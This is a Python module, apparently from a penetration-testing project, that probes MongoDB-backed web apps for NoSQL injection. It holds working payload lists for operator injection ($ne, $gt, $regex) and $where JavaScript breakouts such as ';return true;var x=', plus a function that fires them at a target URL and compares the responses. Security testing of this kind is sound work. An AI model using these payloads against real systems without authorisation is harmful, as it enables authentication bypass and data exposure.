#!/usr/bin/env python

"""
NoSQL injection probing for MongoDB-backed web applications: PHP/
Express.js associative-array operator injection (a request parameter
like `id=1` becomes exploitable as `id[$ne]=1`, `id[$gt]=`, etc. when a
framework auto-parses bracket query-string syntax into nested
structures that get passed straight into a MongoDB query) and
$where-clause JavaScript injection (`id=' || '1'=='1`, `id=';return
true;var x='`) for apps that build $where clauses via string
concatenation.

This is a clean reimplementation of the technique class NoSQLMap's
getApps()/postApps() are built on (both credit Ming Chow's DEF CON 21
"Abusing NoSQL Databases" talk as the underlying research), not a port
of that function - which is ~1700 lines tightly coupled to interactive
raw_input() prompts and module-level global state (see
lib/nosql/mongo_client.py's docstring for the corresponding decision
on the direct-MongoDB-connection side). This module needed no such
compromise: unlike mongo_client.py, it only needs stdlib HTTP, so it
was built and verified the same way as the rest of this project - see
doc/NEXTGEN.md for the live tests against two real vulnerable targets
(operator injection and $where injection, separately).
"""

import time
import difflib

try:
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    from urllib.request import Request, urlopen
    from urllib.error import HTTPError, URLError
except ImportError:
    from urlparse import urlparse, parse_qs, urlunparse
    from urllib import urlencode
    from urllib2 import Request, urlopen, HTTPError, URLError


# Associative-array operator injection: exploits frameworks (Express.js
# with the qs library, some PHP setups) that parse `param[$op]=value`
# query-string syntax into a nested dict/array passed straight into a
# MongoDB query filter.
OPERATOR_PAYLOADS = [
    {"name": "not-equal (always true)", "operator": "$ne", "value": "1", "category": "boolean_true"},
    {"name": "not-equal to nonsense (always true)", "operator": "$ne", "value": "__nosqlprobe_nonexistent__", "category": "boolean_true"},
    {"name": "greater-than empty (always true for strings)", "operator": "$gt", "value": "", "category": "boolean_true"},
    {"name": "regex match-all", "operator": "$regex", "value": ".*", "category": "boolean_true"},
    {"name": "exists check", "operator": "$exists", "value": "true", "category": "boolean_true"},
]

# $where JavaScript-clause injection: exploits apps that build a
# $where filter via string concatenation of the parameter value.
# "OR-true string breakout" needs a truthy leading fragment before the
# `||` (e.g. "x'"), not an empty one - an earlier version used a bare
# "' || ..." whose leading segment evaluates to an empty (falsy)
# string in both JS and Python, so "'' || <anything falsy-ish>" never
# actually breaks out regardless of target. Caught by testing against
# a real $where-vulnerable target and finding it silently missed a
# confirmed-real bypass, not assumed correct from the payload text
# alone - see doc/NEXTGEN.md.
WHERE_PAYLOADS = [
    {"name": "OR-true string breakout", "value": "x' || 'a'=='a", "category": "boolean_true"},
    {"name": "OR-true numeric breakout", "value": "1 || 1==1", "category": "boolean_true"},
    {"name": "statement injection, always true", "value": "';return true;var x='", "category": "boolean_true"},
    {"name": "statement injection, always false", "value": "';return false;var x='", "category": "boolean_false"},
]


def _build_url_with_param(url, param, value):
    """Replaces `param`'s value in url's query string, preserving every other parameter."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _build_url_with_operator(url, param, operator, value):
    """Builds param[$operator]=value syntax, e.g. id=1 -> id[$ne]=1."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs.pop(param, None)
    new_query = urlencode(qs, doseq=True)
    bracket_param = "%s[%s]" % (param, operator)
    extra = urlencode({bracket_param: value})
    combined = "%s&%s" % (new_query, extra) if new_query else extra
    return urlunparse(parsed._replace(query=combined))


def _fetch(url, headers=None, timeout=10):
    """Returns (status_code, body_text, elapsed_seconds) or (None, None, elapsed) on error."""
    req = Request(url, headers=headers or {})
    start = time.time()
    try:
        resp = urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", "replace")
        elapsed = time.time() - start
        return resp.getcode(), body, elapsed
    except HTTPError as ex:
        elapsed = time.time() - start
        try:
            body = ex.read().decode("utf-8", "replace")
        except Exception:
            body = ""
        return ex.code, body, elapsed
    except URLError:
        elapsed = time.time() - start
        return None, None, elapsed


def probe(url, param, headers=None, timeout=10, time_based_threshold=4.0):
    """
    Sends a baseline request, then every operator- and $where-style
    payload, comparing each response's status/length/timing against the
    baseline. Returns a dict:
        {"baseline": {...}, "findings": [ {payload, category, url,
         status, length, elapsed, anomalous, reason}, ... ],
         "likely_injectable": bool}

    "anomalous" is a per-payload verdict (status/length differs from
    baseline in a way consistent with the payload's expected category,
    or the response took much longer than baseline for time-based
    checks). "likely_injectable" is true only if at least one
    boolean_true-category payload produced a response that differs from
    baseline the way a genuinely-evaluated always-true condition would
    (not merely "any difference at all", to avoid flagging normal
    parameter-sensitive pages as false positives).
    """
    baseline_status, baseline_body, baseline_elapsed = _fetch(url, headers, timeout)
    baseline = {
        "status": baseline_status,
        "length": len(baseline_body) if baseline_body is not None else None,
        "elapsed": round(baseline_elapsed, 3),
    }

    if baseline_status is None:
        return {"baseline": baseline, "findings": [], "likely_injectable": False,
                "error": "Could not reach the target for a baseline request."}

    findings = []
    any_true_anomaly = False

    all_payloads = (
        [(p, "operator") for p in OPERATOR_PAYLOADS] +
        [(p, "where") for p in WHERE_PAYLOADS]
    )

    for payload, kind in all_payloads:
        if kind == "operator":
            test_url = _build_url_with_operator(url, param, payload["operator"], payload["value"])
        else:
            test_url = _build_url_with_param(url, param, payload["value"])

        status, body, elapsed = _fetch(test_url, headers, timeout)
        length = len(body) if body is not None else None

        anomalous = False
        reason = None

        if status is None:
            reason = "request failed"
        elif payload["category"] == "boolean_true":
            if status != baseline["status"]:
                anomalous, reason = True, "status differs from baseline (%s vs %s)" % (status, baseline["status"])
            elif baseline_body is not None and body is not None:
                # Content-similarity ratio (difflib, stdlib) rather than
                # length alone - sqlmap's own dynamic-content comparison
                # works the same way, for the same reason: two
                # semantically-different responses can happen to be
                # nearly the same LENGTH ("Access denied" vs "Welcome,
                # realuser!" differ by only 5 characters despite being
                # completely different pages), which a length-only
                # threshold misses regardless of how it's tuned - caught
                # by testing against a real $where-vulnerable target
                # where a confirmed-real bypass was silently missed by
                # two successive length-threshold formulas before this
                # fix, not assumed sufficient from the formula alone -
                # see doc/NEXTGEN.md.
                similarity = difflib.SequenceMatcher(None, baseline_body, body).ratio()
                if similarity < 0.90:
                    anomalous, reason = True, "response content differs materially from baseline (%.0f%% similar)" % (similarity * 100)
            if anomalous:
                any_true_anomaly = True
        elif payload["category"] == "boolean_false":
            if status == 200 and baseline["length"] and length is not None and abs(length - baseline["length"]) < 5:
                # an "always false" condition returning the SAME content as baseline
                # is itself a signal worth surfacing (suggests the false-branch payload
                # had no effect, i.e. differs from the true-branch behavior) - reported
                # for context, not counted toward likely_injectable on its own.
                reason = "always-false payload produced baseline-like response (contextual signal)"

        findings.append({
            "payload": payload["name"], "category": payload["category"], "url": test_url,
            "status": status, "length": length, "elapsed": round(elapsed, 3) if elapsed else None,
            "anomalous": anomalous, "reason": reason,
        })

    return {"baseline": baseline, "findings": findings, "likely_injectable": any_true_anomaly}
